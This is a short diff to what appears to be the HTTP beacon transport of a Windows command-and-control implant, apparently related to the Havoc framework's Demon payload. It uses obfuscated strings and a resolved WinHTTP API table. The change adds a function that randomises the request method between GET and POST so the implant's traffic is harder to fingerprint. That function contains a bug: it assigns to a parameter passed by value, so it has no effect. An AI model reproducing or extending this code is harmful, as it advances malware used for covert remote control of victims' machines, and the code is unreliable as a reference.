@@ -69,7 +69,7 @@ namespace Http {
      VOID CreateRequestContext(_request_context* req_ctx) {
         HEXANE
 
-        wchar_t *endpoint   = { };
+        const wchar_t *endpoint = { };
 
         if (!Ctx->transport.http->handle) {
             if (!(Ctx->transport.http->handle = Ctx->win32.WinHttpOpen(Ctx->transport.http->useragent, WINHTTP_ACCESS_TYPE_NO_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0))) {
@@ -183,6 +183,17 @@ namespace Http {
         }
     }
 
+    VOID SelectMethod(LPWSTR method) {
+        HEXANE
+
+        // todo: based method selection?
+        if (Utils::Random::RandomNumber32() % 2 == 0) {
+            method = OBFW(L"GET");
+        } else {
+            method = OBFW(L"POST");
+        }
+    }
+
     VOID HttpCallback(const _stream *const out, _stream **in) {
         HEXANE
         // https://github.com/HavocFramework/Havoc/blob/ea3646e055eb1612dcc956130fd632029dbf0b86/payloads/Demon/src/core/transportHttp.c#L21
@@ -194,8 +205,7 @@ namespace Http {
         uint32_t n_status   = sizeof(uint32_t);
 
         // todo: reverting tokens during http operations
-        // todo: dynamic method selection/context-based?
-        Ctx->transport.http->method = OBFW(L"GET");
+        SelectMethod(Ctx->transport.http->method);
 
         if (
             !CreateRequestContext(&req_ctx) ||
